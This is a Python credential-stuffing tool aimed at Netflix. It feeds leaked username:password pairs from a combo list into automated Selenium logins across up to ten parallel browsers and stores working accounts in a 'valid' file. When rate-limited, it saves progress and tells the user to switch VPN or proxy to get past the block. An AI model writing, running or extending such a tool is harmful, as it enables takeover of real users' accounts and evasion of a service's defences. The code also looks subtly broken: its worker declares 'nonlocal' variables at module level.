import logging
import os
import sys
import time
import threading
from queue import Queue
from pathlib import Path

import requests
from countries import find_IP
from header import title, user_options
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys


BASE_DIR = Path(__file__).parent
RESUME_FILE = BASE_DIR / "resume"


def find_combo_path() -> Path:
    """Locate the combo list in common locations."""

    candidates = [
        BASE_DIR / "netflix",
        BASE_DIR / "netflix.txt",
        Path.cwd() / "netflix",
        Path.cwd() / "netflix.txt",
    ]

    for candidate in candidates:
        if candidate.exists():
            return candidate

    expected_locations = "\n".join(str(path) for path in candidates)
    print(
        f"\n\n\033[38;5;255mCombo-list not found.\nLooked for the file in:\n{expected_locations}\n"
        "Place it in one of the locations above, without a file extension or with '.txt'.\nEnding."
    )
    exit()


def iter_combos(combo_path: Path):
    """Yield username/password pairs from a combo file without loading it into memory."""

    with combo_path.open("r") as combo_list:
        for line_number, raw_line in enumerate(combo_list, start=1):
            stripped_line = raw_line.strip()
            if not stripped_line:
                continue
            if ":" not in stripped_line:
                logging.warning("Skipping line %s: missing ':' separator", line_number)
                continue

            username, raw_password = stripped_line.split(":", 1)
            password = raw_password.split()[0]
            if not username or not password:
                logging.warning("Skipping line %s: missing username or password", line_number)
                continue

            yield username, password


def count_combos(combo_path: Path) -> int:
    return sum(1 for _ in iter_combos(combo_path))


def combo_source():
    if RESUME_FILE.exists():
        return RESUME_FILE, True
    return find_combo_path(), False


def write_resume(combo_path: Path, processed_count: int):
    with combo_path.open("r") as source, RESUME_FILE.open("w") as resume:
        for index, line in enumerate(source, start=1):
            if index > processed_count:
                resume.write(line)


details = [find_IP()[0], find_IP()[1], find_IP()[2]]
hits = 0
clear_page = 0
max_browsers = 1

page = "https://www.netflix.com/login"
while True:
    logging.getLogger().setLevel(logging.CRITICAL)
    title()
    print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
    user_options()
    options = input("Pick an option: ")
    while True:
        if options == "1":
            combo_path, resume_flag = combo_source()
            hits = 0
            browser_input = input("\nHow many browsers to use at once? (1-10, default 1): ").strip() or "1"
            try:
                max_browsers = max(1, min(10, int(browser_input)))
            except ValueError:
                max_browsers = 1
            total_combos = count_combos(combo_path)
            if total_combos == 0:
                print("\n\033[38;5;226mNo Accounts for current country.\n")
                break

            processed_count = 0
            title()
            if resume_flag:
                print("\033[38;5;7m\nResume file found. Resuming from given combo.")
            print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
            processed_lock = threading.Lock()
            stop_event = threading.Event()
            combo_queue: Queue = Queue(max_browsers * 2)

            def worker():
                nonlocal hits, processed_count, clear_page
                while True:
                    combo = combo_queue.get()
                    if combo is None:
                        combo_queue.task_done()
                        break
                    if stop_event.is_set():
                        combo_queue.task_done()
                        continue
                    username, password = combo
                    with processed_lock:
                        current_index = processed_count + 1
                    try:
                        print(
                            "\033[38;5;7m\n\r\rConnection Status:\033[38;5;46m OK \033[38;5;7m| \033[38;5;7mCombo No.{}:\033[38;5;190m {}:{} \033[38;5;7m| Result: ".format(
                                str(current_index), username, password.strip()), end=''
                        )
                        browser_options = Options()
                        browser_options.add_argument(
                            'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537'
                        )
                        browser = webdriver.Chrome(options=browser_options)
                        browser.set_window_size(500, 700)
                        browser.get(page)
                        time.sleep(0.7)
                        if browser.find_elements(By.XPATH, '//button[@id="onetrust-reject-all-handler"]'):
                            button = browser.find_element(By.XPATH, '//button[@id="onetrust-reject-all-handler"]')
                            button.click()
                            time.sleep(0.7)
                        if browser.find_elements(By.XPATH, '//button[@data-uia="login-toggle-button"]'):
                            if browser.find_element(By.XPATH, '//button[@data-uia="login-toggle-button"]').text == "Use password":
                                button = browser.find_element(By.XPATH, '//*[@id="appMountPoint"]/div/div/div[2]/div/form/button[2]')
                                button.click()
                        time.sleep(0.7)
                        login = browser.find_element(By.XPATH, '//input[@name="userLoginId"]')
                        password_field = browser.find_element(By.XPATH, '//input[@name="password"]')
                        login.send_keys(username)
                        time.sleep(0.7)
                        password_field.send_keys(password.strip())
                        time.sleep(0.7)
                        password_field.send_keys(Keys.TAB)
                        password_field.send_keys(Keys.ENTER)
                        time.sleep(0.7)
                        if browser.current_url == 'https://www.netflix.com/login' or browser.find_element(By.XPATH, '//div[@id="loginErrorMessage"]'):
                            print("\033[38;5;196m Invalid Account", end='')
                        if browser.current_url == 'https://www.netflix.com/browse' or browser.find_elements(By.XPATH, '//div[@class=\"profiles-gate-container\"]'):
                            print("\033[38;5;46m Valid Account - Stored", end='')
                            hits += 1
                            with open('valid', 'a') as valid:
                                valid.write("{}:{}\n".format(username, password))
                    except Exception:
                        request = requests.get(page)
                        if request.status_code == 403:
                            print(
                                "\033[38;5;7m\nConnection Status:\033[38;5;190m Too many requests:\033[38;5;196m Access Denied \n\n\033[38;5;7mChange VPN/Proxy and start the checker again to resume from current combo.\n"
                            )
                            stop_event.set()
                    finally:
                        if 'browser' in locals():
                            try:
                                browser.close()
                            except Exception:
                                pass
                        with processed_lock:
                            processed_count += 1
                            clear_page += 1
                            if clear_page > 10:
                                title()
                                print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
                                clear_page = 0
                            sys.stdout.write(
                                "\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8"
                                % (hits, str(processed_count), str(total_combos))
                            )
                            sys.stdout.flush()
                        combo_queue.task_done()

            threads = []
            for _ in range(max_browsers):
                thread = threading.Thread(target=worker, daemon=True)
                thread.start()
                threads.append(thread)

            for username, password in iter_combos(combo_path):
                if stop_event.is_set():
                    break
                combo_queue.put((username, password))

            for _ in range(max_browsers):
                combo_queue.put(None)

            combo_queue.join()
            if stop_event.is_set():
                write_resume(combo_path, processed_count)
                exit()
            for thread in threads:
                thread.join()

            print("\n\033[38;5;226mAll done.")
            input("\n\033[38;5;226mPress Enter.")
            if RESUME_FILE.exists():
                os.remove('resume')
            break
        if options == "2":
            #Exit
            exit()
        else:
            break
